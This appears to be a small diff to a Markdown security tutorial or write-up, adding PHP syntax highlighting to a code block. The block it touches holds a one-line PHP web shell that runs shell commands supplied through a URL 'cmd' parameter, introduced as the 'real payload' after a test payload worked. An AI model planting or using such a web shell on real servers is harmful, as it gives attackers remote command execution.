@@ -1988,7 +1988,7 @@ Since we know that our test payload worked, we can now create a real payload tha
 
 This is a longer version than a possible one-liner that can be used.
 
-```
+```php
 <?php system($_GET["cmd"]);?>
 ```
 
